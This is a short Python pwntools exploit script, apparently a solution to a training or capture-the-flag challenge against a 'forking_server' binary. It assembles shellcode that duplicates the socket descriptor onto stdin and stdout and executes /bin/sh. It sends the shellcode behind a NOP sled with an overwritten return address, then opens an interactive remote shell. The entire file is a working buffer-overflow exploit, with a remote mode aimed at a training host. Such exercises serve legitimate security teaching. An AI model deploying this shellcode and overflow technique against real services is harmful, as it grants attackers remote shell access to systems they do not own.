from pwn import *

#at the first breakpoint we can get the fd of the socket (in rax, seems 3) because it is at the "socket" function which "Upon successful completion, socket() shall return a non-negative integer, the socket file descriptor"

COMMANDS = """
b *0x00000000004015be 
b *0x000000000040146b
c
"""

context.arch = "amd64" 

exploit = """
xor rax, rax
mov rax, 0x21
mov rdi, rdi
mov rsi, 0
syscall
xor rax, rax
mov rax, 0x21
mov rdi, rdi
mov rsi, 1
syscall
mov rax, 0x3b
mov rdi, 0x0068732f6e69622f 
push rdi
mov rdi, rsp
mov rsi, 0
mov rdx, 0
syscall
"""


if args.REMOTE:
    c = remote("forking-server.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./forking_server" , gdbscript=COMMANDS)
    else:
        c = process("./forking_server")

c.recvuntil(b"name?")

assembled_exploit = asm(exploit)

c.send(b"\x90" *(1016-len(assembled_exploit)) + assembled_exploit + p64(0x00404100)) #p64(..) Ã¨ uguale a scrivere b"\x00\x41\x40\x00"

c.interactive()